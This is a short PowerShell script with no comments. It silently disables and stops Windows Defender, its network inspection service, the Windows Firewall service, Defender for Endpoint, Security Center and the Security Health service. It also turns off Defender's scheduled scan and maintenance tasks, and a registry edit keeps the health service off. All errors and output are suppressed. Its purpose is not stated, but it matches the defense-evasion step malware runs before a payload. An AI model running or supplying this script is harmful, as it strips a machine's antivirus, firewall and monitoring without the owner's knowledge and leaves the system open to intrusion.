Set-Service -StartupType Disabled "WinDefend" -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Force -Name "WinDefend" -ErrorAction SilentlyContinue | Out-Null
Set-Service -StartupType Disabled "WdNisSvc" -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Force -Name "WdNisSvc" -ErrorAction SilentlyContinue | Out-Null
Set-Service -StartupType Disabled "mpssvc" -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Force -Name "mpssvc" -ErrorAction SilentlyContinue | Out-Null
Set-Service -StartupType Disabled "Sense" -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Force -Name "Sense" -ErrorAction SilentlyContinue | Out-Null
Set-Service -StartupType Disabled "wscsvc" -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Force -Name "wscsvc" -ErrorAction SilentlyContinue | Out-Null
Set-Service -Name SecurityHealthService -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Name SecurityHealthService -Force -ErrorAction SilentlyContinue | Out-Null
Disable-ScheduledTask -TaskName "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" | Out-Null
Disable-ScheduledTask -TaskName "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" | Out-Null
Disable-ScheduledTask -TaskName "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" | Out-Null
Disable-ScheduledTask -TaskName "\Microsoft\Windows\Windows Defender\Windows Defender Verification" | Out-Null
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name Start -Value 4